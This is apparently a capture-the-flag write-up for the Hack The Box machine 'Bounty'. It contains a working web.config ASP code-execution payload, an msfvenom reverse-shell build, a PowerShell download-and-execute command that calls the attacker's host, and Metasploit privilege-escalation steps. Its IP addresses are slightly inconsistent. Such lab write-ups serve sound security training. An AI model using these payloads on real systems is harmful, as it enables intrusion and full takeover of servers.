= Bounty Writeup

== Scanning Phase

First, we check the IP of the
link:https://www.hackthebox.eu/home/machines/profile/142[Bounty]
machine and try a `ping`
to see if we have access.

.ping
[source, bash]
----
host$ ping -c2 10.10.10.93
----

image::https://res.cloudinary.com/fluid-attacks/image/upload/v1620330675/blog/bounty-writeup/ping_trcnb5.webp[ping]

Then, we scan the ports with `nmap`.
In this case, we’re going to use basic `nmap`.

[source, bash]
----
host$ nmap 10.10.10.93
----

And, we see that there is only one port open `port 80`.

image::https://res.cloudinary.com/fluid-attacks/image/upload/v1620330675/blog/bounty-writeup/nmap_earkie.webp[nmap]

Then, we try to access `port 80` with our browser,
and it opens a web page with an image of Merlin.

image::https://res.cloudinary.com/fluid-attacks/image/upload/v1620330675/blog/bounty-writeup/web_fdltrp.webp[web-page]

As we see on this page,
there is nothing more than an image,
so we’re going to scan the whole web server with `dirbuster`
to see if we can access something useful.

[source, bash]
----
host$ dirb http://10.10.10.91
----


image::https://res.cloudinary.com/fluid-attacks/image/upload/v1620330674/blog/bounty-writeup/dirb_ozvyui.webp[dirb-scan]

Here we found a folder where uploaded files are stored.
We need the page of the upload functionality.
With `dirbuster`, and some options,
we can set different extensions and obtain what we are looking for.
Since this is a `Windows` machine,
we are going to use `asp` and `aspx` extensions.

[source, bash]
----
host$ dirb http://10.10.10.91 -X .asp,.aspx
----

image::https://res.cloudinary.com/fluid-attacks/image/upload/v1620330672/blog/bounty-writeup/dirb2_kjlopp.webp[dirb-scan2]
image::https://res.cloudinary.com/fluid-attacks/image/upload/v1620330672/blog/bounty-writeup/upload-page_eu4cfl.webp[upload-page]

== Getting user

In the last step we got an upload page,
but with no further instructions.
There we can try to upload an image
and check the result.

image::https://res.cloudinary.com/fluid-attacks/image/upload/v1620330674/blog/bounty-writeup/upload1_ewlizg.webp[upload1]

But if we try with a webshell in `aspx` or `asp`
it returns an error.

image::https://res.cloudinary.com/fluid-attacks/image/upload/v1620330673/blog/bounty-writeup/upload2_dgzfkc.webp[upload2]

The web server has a filter
that possibly checks the extension of the uploaded file.
If you try with double extension it won’t work either.

So what can we do?
In `Windows` there are `3` major types of extensions:
`asp`, `aspx`, and `config`.
We already tried the `asp` and `aspx` extensions,
what happens if we upload a `web.config` file?

[source, xml,linenums]
----
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*"
           modules="IsapiModule"
           scriptProcessor="%windir%\system32\inetsrv\asp.dll"
           resourceType="Unspecified"
           requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
----

image::https://res.cloudinary.com/fluid-attacks/image/upload/v1620330674/blog/bounty-writeup/upload1_ewlizg.webp[upload11]

We can see the result is positive.
The `web.config` file is used by `IIS` servers
to store settings that come with the installation of the `API`.

With this, we can start to exploit this machine.
There is a vulnerability on the `web.config` file processing
that could allow an attacker to execute code remotely,
by injecting `asp` code in the file
(More information can be found
link:https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/[here]
).

So, in order to have remote code execution (`RCE`),
we need to add the following lines
to our `web.config` file:

----
<!--
<%
Response.write("-"&"->")
Response.write("</p><pre>")
Set wShell1 = CreateObject("WScript.Shell")
Set cmd1 = wShell1.Exec("cmd.exe /c whoami")
output1 = cmd1.StdOut.Readall()
set cmd1 = nothing: Set wShell1 = nothing
Response.write(output1)
Response.write("</pre><p><!-"&"-")
%>
-->
----

Then, we upload it,
and access the file via the web, as before.

image::https://res.cloudinary.com/fluid-attacks/image/upload/v1620330674/blog/bounty-writeup/rce-ok_ae3o75.webp[rce-ok]

*Eureka!* With this, we can have our user flag,
but we want an active shell
that we can use for further enumeration.
For this, we can use `msfvenom`.
This is a tool that creates payloads
in order to gain access to a machine.
It is installed by default on `Kali`;
it also comes with the installation of `Metasploit`.
Then, we upload our file to the server with our `RCE`
and start a web server on our side
to download our exploit.

First, the exploit with msfvenom:

[source, bash]
----
host$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=ip.ip.ip.ip LPORT=port -f exe -o myexploit.exe --smallest
----

This will create a malicious file.
When executed on the server
it will give us a reverse shell with our `RCE` file using `meterpreter`.
This is an advanced, dynamically extensible payload
that uses in-memory `DLL` injection stagers,
and is extended over the network at runtime.

Then we need to start a web server in our machine.
We can do it with `Python` by running:

[source, bash]
----
host$ python -m SimpleHTTPServer 7000
----

To make the server download our file,
we can use the next `PowerShell` command
in our `web.config` file
replacing the `whoami` one:

[source, xml]
----
Set cmd1 = wShell1.Exec("cmd.exe /c powershell -NoProfile -ExecutionPolicy unrestricted -Command (new-object System.Net.WebClient).Downloadfile('http://ip.ip.ip.ip:7000/myexploit.exe', 'C:\Windows\Temp\myexploit.exe')")
----

Upload it, and then open it on a private tab.
Now, we can see that the server downloaded our file.

image::https://res.cloudinary.com/fluid-attacks/image/upload/v1620330672/blog/bounty-writeup/download_cxvzgn.webp[download]

Then we need to start our listener.
We can use `Metasploit` to do it:

[source, bash]
----
host$ msfconsole
msf > use exploit/multi/handler
msf exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
msf exploit(multi/handler) > set LHOST ip.ip.ip.ip
msf exploit(multi/handler) > set LPORT port
msf exploit(multi/handler) > run
----

With this, we are ready to initiate our reverse shell.
In order to do it,
we need to run our exploit on the server
with the same `RCE` method as before,
changing the command to the following:

[source, xml]
----
Set cmd1 = wShell1.Exec("cmd.exe /c C:\Windows\Temp\myexploit.exe")
----

Upload it, open the page of the `web.config` file
and we have our reverse shell.

image::https://res.cloudinary.com/fluid-attacks/image/upload/v1620330671/blog/bounty-writeup/reverse-shell_v0yoxx.webp[reverse-shell]

== Getting root

With `meterpreter`
we can start to enumerate the server.

image::https://res.cloudinary.com/fluid-attacks/image/upload/v1620330674/blog/bounty-writeup/sys-info_wlfn7g.webp[sys-info]

And, we see that the server has an `x64 Architecture`.
We are going to repeat the process
(`msfvenom`, `upload`, `handler`, `run`)
but now with the payload:

----
windows/x64/meterpreter/reverse_tcp
----

Then, when we have another session opened,
we are going to run the next one:

[source,bash]
----
meterpreter > run post/multi/recon/local_exploit_suggester
----

image::https://res.cloudinary.com/fluid-attacks/image/upload/v1620330674/blog/bounty-writeup/exploit-suggester_cr3q7v.webp[exploit-suggester]

Here we got some exploits
that we can use to elevate to `Administrator`,
we are going to use the first one with:

[source,bash]
----
meterpreter > background
msf exploit(multi/handler) > use exploit/windows/local/ms10_092_schelevator
msf exploit(windows/local/ms10_092_schelevator) > set SESSION sessionnum
msf exploit(windows/local/ms10_092_schelevator) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf exploit(windows/local/ms10_092_schelevator) > set LPORT port
msf exploit(windows/local/ms10_092_schelevator) > set LHOST ip.ip.ip.ip
msf exploit(windows/local/ms10_092_schelevator) > run
----

When it finishes,
we will have a new session created
and with user `NT Authority\System`.

image::https://res.cloudinary.com/fluid-attacks/image/upload/v1620330673/blog/bounty-writeup/admin_bqoqsf.webp[admin]

With this we can read our `root` flag.

On this challenge, we learned there was a vulnerability
with the `web.config` file.
We also learned to always check the architecture
when we access a machine as a user,
and how to use some of the `meterpreter` commands.
